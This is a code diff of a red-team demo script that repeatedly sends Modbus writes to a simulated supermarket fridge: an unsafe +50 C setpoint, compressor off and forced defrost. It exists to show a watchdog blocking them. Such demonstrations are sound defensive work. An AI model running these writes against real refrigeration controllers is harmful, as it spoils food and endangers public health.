@@ -1,18 +1,22 @@
 """
 Attacker — the rogue device on the store network. Runs on Daya's laptop.
 
-This is the demo's red team. It recreates, against our OWN simulated fridge on
-our OWN closed demo network, the publicly reported October 2026 supermarket
-refrigeration attack: drive the setpoint to an unsafe temperature and force a
-continuous defrost so the case warms up and the food spoils.
+This is the demo's red team. On our OWN simulated fridge, on our OWN closed demo
+network, it recreates the October 2026 supermarket refrigeration attack: drive
+the setpoint to an unsafe temperature and force a continuous defrost so the case
+warms up and the food spoils.
 
-Its whole purpose is to be stopped: with Cold Guard armed, every step below is
-blocked; in bypass mode they get through and the dashboard shows the case
-climbing past the food-safety line. It targets only the addresses in
-profile.json, on the demo network, and does nothing a normal Modbus client
-can't do — the point is that the protocol trusts it, and the watchdog shouldn't.
+It attacks continuously, once every half second, so you can watch Cold Guard's
+state decide the outcome live:
+  * watchdog ARMED  -> every attempt reads BLOCKED, the case stays cold
+  * watchdog BYPASS -> attempts read GOT THROUGH, the case climbs past the
+                       food-safety line
+  * re-arm again    -> attempts go back to BLOCKED and the store controller
+                       pulls the case back down to safe
 
-Run:  python attacker.py            (reads profile.json for addresses)
+Stop it with Ctrl+C. It only touches the addresses in profile.json.
+
+Run:  python3 attacker.py            (reads profile.json for addresses)
 """
 
 import json
@@ -33,53 +37,51 @@ DANGER_SETPOINT = 500   # +50.0 C in tenths — the headline from the real attac
 
 
 def connect():
-    # The attacker targets whatever answers as the fridge on the network,
-    # which in the demo is Cold Guard ("watchdog" in profile.json).
     host, port = PROFILE["watchdog"].rsplit(":", 1)
     return ModbusTcpClient(host, port=int(port))
 
 
-def step(label, fn):
-    """Run one attack step and report whether the watchdog let it through."""
-    result = fn()
-    blocked = result.isError()
-    mark = "BLOCKED" if blocked else "GOT THROUGH"
-    print(f"  [{mark}] {label}")
-    return blocked
-
-
 def main():
     client = connect()
-    if not client.connect():
-        print("attacker: could not reach the target")
-        return
+    client.connect()
+    print("Attacker: continuously pushing the French supermarket attack.")
+    print("(Ctrl+C to stop)\n", flush=True)
 
-    print("Attacker: replaying the supermarket refrigeration attack\n")
+    while True:
+        try:
+            if not client.connected:
+                client.connect()
 
-    # 1. Raise the setpoint to a spoilage temperature.
-    step(f"set setpoint to {DANGER_SETPOINT/10:.0f}C",
-         lambda: client.write_register(HR_SETPOINT, DANGER_SETPOINT & 0xFFFF))
-    time.sleep(0.5)
+            # Three malicious writes: unsafe setpoint, compressor off, defrost on.
+            r1 = client.write_register(HR_SETPOINT, DANGER_SETPOINT & 0xFFFF)
+            r2 = client.write_coil(CO_COMPRESSOR, False)
+            r3 = client.write_coil(CO_DEFROST, True)
 
-    # 2. Turn the compressor off so nothing fights the warming.
-    step("turn compressor OFF",
-         lambda: client.write_coil(CO_COMPRESSOR, False))
-    time.sleep(0.5)
+            results = [r1, r2, r3]
+            blocked = all(r.isError() for r in results)
+            through = all(not r.isError() for r in results)
+            if blocked:
+                status = "BLOCKED       "
+            elif through:
+                status = "GOT THROUGH ⚠ "
+            else:
+                status = "partial        "
+            print(f"  attack -> {status}", end="\r", flush=True)
 
-    # 3. Force defrost on to actively heat the case.
-    step("force defrost ON",
-         lambda: client.write_coil(CO_DEFROST, True))
-    time.sleep(0.5)
+        except Exception:
+            # Watchdog restarting or network blip; try to reconnect next loop.
+            print("  attack -> no connection (watchdog restarting?)", end="\r", flush=True)
+            try:
+                client.close()
+            except Exception:
+                pass
+            client = connect()
 
-    # 4. Hammer defrost repeatedly — both a continuous-defrost push and a burst.
-    print("\n  ...flooding defrost-on commands...")
-    for _ in range(8):
-        step("defrost ON (flood)", lambda: client.write_coil(CO_DEFROST, True))
-        time.sleep(0.2)
-
-    print("\nAttacker done. With Cold Guard armed, every line should read BLOCKED.")
-    client.close()
+        time.sleep(0.5)
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nAttacker stopped.")
